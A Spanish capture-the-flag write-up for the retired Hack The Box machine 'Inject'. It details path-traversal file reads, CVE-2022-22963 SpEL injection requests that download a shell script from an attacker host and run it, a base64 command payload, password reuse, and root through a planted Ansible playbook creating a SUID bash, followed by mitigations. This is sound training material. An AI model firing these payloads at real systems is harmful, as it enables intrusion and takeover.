---
machine: Inject
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, spring, tomcat, file-read, directory-traversal, cve-2022-22963, spel, ansible, privesc]
---

# Inject — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Tomcat sirve una aplicación Spring en `8080`. El visor de imágenes acepta una ruta en `img` y permite traversal, con lo que se leen `/etc/passwd`, el `settings.xml` de Maven de `frank` y el `pom.xml` del proyecto. El `pom.xml` declara `spring-cloud-function-web` 3.2.2, vulnerable a la CVE-2022-22963: una expresión SpEL en la cabecera `spring.cloud.function.routing-expression` se evalúa al llamar a `/functionRouter`, lo que da ejecución como `frank`. La contraseña de Maven sirve para pasar a `phil` con `su`. `phil` puede escribir en `/opt/automation/tasks`, que un cron de root procesa con `ansible-parallel`; un playbook propio crea una bash SUID y da root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,8080 <IP>
```

- `22`: OpenSSH 8.2p1 Ubuntu.
- `8080`: Tomcat con la aplicación Spring.

```bash
echo '<IP> inject.htb' | sudo tee -a /etc/hosts
feroxbuster -u http://inject.htb:8080 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

## Enumeración

La página principal permite subir imágenes y devuelve enlaces del tipo `/show_image?img=<archivo>`. El parámetro no valida la ruta:

```bash
curl 'http://inject.htb:8080/show_image?img=../../../../etc/passwd'
curl 'http://inject.htb:8080/show_image?img=../../../../home/frank/.m2/settings.xml'
curl 'http://inject.htb:8080/show_image?img=../../../../var/www/WebApp/pom.xml'
```

El `settings.xml` contiene credenciales de Maven de `phil`, pero no sirven para SSH. El `pom.xml` revela el stack y la versión:

```text
spring-cloud-function-web 3.2.2
```

Esa versión es anterior a 3.2.3 y vulnerable a la CVE-2022-22963 (inyección SpEL en Spring Cloud Function). La comprobación con Snyk sobre el `pom.xml` confirma la dependencia.

## Foothold

El endpoint afectado es `/functionRouter`. La expresión se envía en una cabecera y se evalúa antes de enrutar la función:

```http
POST /functionRouter HTTP/1.1
Host: inject.htb:8080
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("curl http://<LHOST>/shell.sh -o /tmp/shell.sh")
Content-Type: application/x-www-form-urlencoded

test
```

```http
POST /functionRouter HTTP/1.1
Host: inject.htb:8080
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("bash /tmp/shell.sh")
Content-Type: application/x-www-form-urlencoded

test
```

La ejecución es como `frank`. Si el payload incluye una tubería, Java la interpreta como parte del comando; la expansión de llaves de bash evita el problema:

```text
T(java.lang.Runtime).getRuntime().exec("bash -c {echo,<BASE64>}|{base64,-d}|bash")
```

## Movimiento lateral

La contraseña de Maven del `settings.xml` es válida para `phil`:

```bash
su phil
# contraseña del settings.xml
```

`phil` puede leer `user.txt` y escribir en el directorio de automatización.

## Escalada de privilegios

`/opt/automation/tasks` contiene playbooks y un cron de root ejecuta:

```text
/usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml
```

Basta con dejar un YAML propio en ese directorio:

```yaml
- hosts: localhost
  tasks:
    - name: shell
      shell: cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash
```

En la siguiente ejecución aparece `/tmp/rootbash` con SUID de root:

```bash
/tmp/rootbash -p
id
```

## Evidencia

- `show_image` leyendo archivos fuera del directorio web.
- `pom.xml` con `spring-cloud-function-web` 3.2.2.
- Petición a `/functionRouter` con la cabecera SpEL y shell como `frank`.
- `settings.xml` con la contraseña de `phil` y `su` correcto.
- Playbook en `/opt/automation/tasks` y bash SUID propiedad de root.

## Lecciones aprendidas

- Un parámetro que recibe rutas debe resolverse contra un directorio base y validarse.
- Las dependencias Java deben revisarse por versión, no solo por el framework principal.
- Una credencial de repositorio Maven puede reutilizarse en el sistema operativo.
- Un directorio de automatización escribible y ejecutado por root es ejecución directa.
- Los playbooks de Ansible se ejecutan con los privilegios del proceso que los lanza.

## Mitigaciones y detección

- Actualizar Spring Cloud Function a una versión corregida y bloquear `/functionRouter` sin autenticación.
- Validar rutas con `realpath` y una lista blanca de directorios.
- Separar credenciales de build y cuentas del sistema; rotarlas y no reutilizarlas.
- Restringir la escritura en `/opt/automation/tasks` y firmar o validar los playbooks.
- Monitorizar procesos `ansible-playbook`/`ansible-parallel` y creación de binarios SUID.
- Alertar de peticiones con la cabecera `spring.cloud.function.routing-expression`.

## Referencias

- [0xdf — Inject](https://0xdf.gitlab.io/2023/07/08/htb-inject.html)
- [Hack The Box — Inject](https://app.hackthebox.com/machines/inject)
- [NVD — CVE-2022-22963](https://nvd.nist.gov/vuln/detail/CVE-2022-22963)
